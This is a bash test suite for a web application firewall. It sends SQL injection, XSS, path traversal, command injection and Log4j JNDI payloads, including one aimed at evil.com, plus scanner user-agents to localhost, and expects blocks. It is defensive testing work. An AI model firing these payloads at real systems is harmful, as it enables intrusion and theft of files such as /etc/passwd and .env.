#!/bin/bash

# Configuration
TARGET_URL='http://localhost:8080'
TIMEOUT=5
OUTPUT_FILE="waf_test_results.log"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to test a URL and check the response code
test_url() {
    local url="$1"
    local description="$2"
    local expected_code="$3"
    local headers="$4"

    local curl_cmd="curl -s -k -w '%{http_code}' --connect-timeout $TIMEOUT"

    # Add headers to curl command
    if [ -n "$headers" ]; then
        while IFS='=' read -r key value; do
            curl_cmd+=" -H \"$key: $value\""
        done <<< "$(echo "$headers" | tr ';' '\n')"
    else
        # Default headers for normal requests
        curl_cmd+=" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'"
        curl_cmd+=" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'"
    fi

    # Add output redirection to curl command
    curl_cmd+=" -o /dev/null"

    # Execute curl command
    response=$(eval "$curl_cmd '$url'" 2>/dev/null)

    if [ "$response" = "$expected_code" ]; then
        printf "${GREEN}[✓]${NC} %-60s [%d]\n" "$description" "$response"
        echo "[PASS] $description - Expected: $expected_code, Got: $response" >> "$OUTPUT_FILE"
        return 0
    else
        printf "${RED}[✗]${NC} %-60s [%d]\n" "$description" "$response"
        echo "[FAIL] $description - Expected: $expected_code, Got: $response" >> "$OUTPUT_FILE"
        return 1
    fi
}

# Test cases array - [URL, Description, Expected Response Code, Custom Headers]
declare -a test_cases=(
    # SQL Injection Tests (Based on rule 942100)
    "$TARGET_URL/?q=SELECT%20*%20FROM%20users"           "SQL Injection - Basic Select"         403     ""
    "$TARGET_URL/?q=UNION%20SELECT%20password"           "SQL Injection - Union Select"         403     ""
    "$TARGET_URL/?q=1'+OR+'1'%3D'1"                     "SQL Injection - Boolean Quote"        403     ""
    "$TARGET_URL/?q=1)+OR+(1=1"                         "SQL Injection - Boolean Paren"        403     ""
    "$TARGET_URL/?q=SLEEP(5)--"                         "SQL Injection - MySQL Sleep"          403     ""
    "$TARGET_URL/?q=pg_sleep(5)--"                      "SQL Injection - PostgreSQL Sleep"     403     ""

    # XSS Tests (Based on rule 941100)
    "$TARGET_URL/?x=<script>alert(1)</script>"           "XSS - Basic Script Tag"              403     ""
    "$TARGET_URL/?x=<img%20src=x%20onerror=alert(1)>"   "XSS - IMG Onerror"                   403     ""
    "$TARGET_URL/?x=javascript:alert(1)"                 "XSS - JavaScript Protocol"           403     ""
    "$TARGET_URL/?x=<svg/onload=alert(1)>"              "XSS - SVG Onload"                    403     ""

    # Path Traversal Tests (Based on rules 930120, 920420)
    "$TARGET_URL/../../etc/passwd"                       "Path Traversal - Basic"              403     ""
    "$TARGET_URL/....//....//etc/passwd"                "Path Traversal - Double Dot"         403     ""
    "$TARGET_URL/.../....//etc/passwd"                  "Path Traversal - Triple Dot"         403     ""

    # RCE Tests (Based on rule 930120)
    "$TARGET_URL/?cmd=cat%20/etc/passwd"                "RCE - Basic Command"                 403     ""
    "$TARGET_URL/?cmd=base64%20/etc/passwd"             "RCE - Base64 Command"               403     ""
    "$TARGET_URL/?cmd=%60whoami%60"                     "RCE - Backticks"                    403     ""

    # Log4j Tests (Based on rule 951100)
    "$TARGET_URL/?x=\${jndi:ldap://evil.com/x}"        "Log4j - JNDI LDAP"                  403     ""
    "$TARGET_URL/?x=\${env:SHELL}"                      "Log4j - Environment"                403     ""

    # HTTP Header Tests
    "$TARGET_URL/"                                      "Header - SQL Injection"              403     "X-Forwarded-For=1' OR '1'='1;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - XSS Cookie"                 403     "Cookie=<script>alert(1)</script>;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - Path Traversal"             403     "Referer=../../etc/passwd;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - Custom X-Attack"            403     "X-Custom-Header=1' UNION SELECT NULL--"

    # Protocol Tests
    "$TARGET_URL/.git/HEAD"                             "Protocol - Git Access"              403     ""
    "$TARGET_URL/.env"                                  "Protocol - Env File"                403     ""
    "$TARGET_URL/.htaccess"                             "Protocol - htaccess"               403     ""

    # Valid Requests
    "$TARGET_URL/"                                      "Valid - Homepage"                   200     ""
    "$TARGET_URL/about"                                 "Valid - About Page"                 200     ""

    # Scanner Detection
    "$TARGET_URL/"                                      "Scanner - SQLMap"                   403     "User-Agent=sqlmap/1.7-dev;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Acunetix"                 403     "User-Agent=acunetix-wvs;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Nikto"                    403     "User-Agent=Nikto/2.1.5;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Nmap"                     403     "User-Agent=Mozilla/5.0 Nmap;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Dirbuster"                403     "User-Agent=DirBuster-1.0-RC1;Accept=*/*"
    "$TARGET_URL/health"                                "Valid - Health Check"               200     "User-Agent=HealthCheck/1.0;Accept=*/*"
    "$TARGET_URL/"                                      "Valid - Chrome Browser"             200     "User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
)

main() {
    # Clear previous results
    > "$OUTPUT_FILE"

    echo -e "${BLUE}WAF Security Test Suite${NC}"
    echo -e "${BLUE}Target: ${NC}$TARGET_URL"
    echo -e "${BLUE}Date: ${NC}$(date)"
    echo "----------------------------------------"

    local total_tests=0
    local passed=0
    local failed=0

    # Calculate total number of tests
    total_tests=$(( ${#test_cases[@]} / 4 ))

    # Run tests
    for ((i=0; i<${#test_cases[@]}; i+=4)); do
        if test_url "${test_cases[i]}" "${test_cases[i+1]}" "${test_cases[i+2]}" "${test_cases[i+3]}"; then
            ((passed++))
        else
            ((failed++))
        fi
    done

    echo "----------------------------------------"
    echo -e "${BLUE}Results Summary${NC}"
    echo -e "Total Tests: $total_tests"
    echo -e "Passed: ${GREEN}$passed${NC}"
    echo -e "Failed: ${RED}$failed${NC}"
    echo -e "\nDetailed results saved to: $OUTPUT_FILE"
}

main
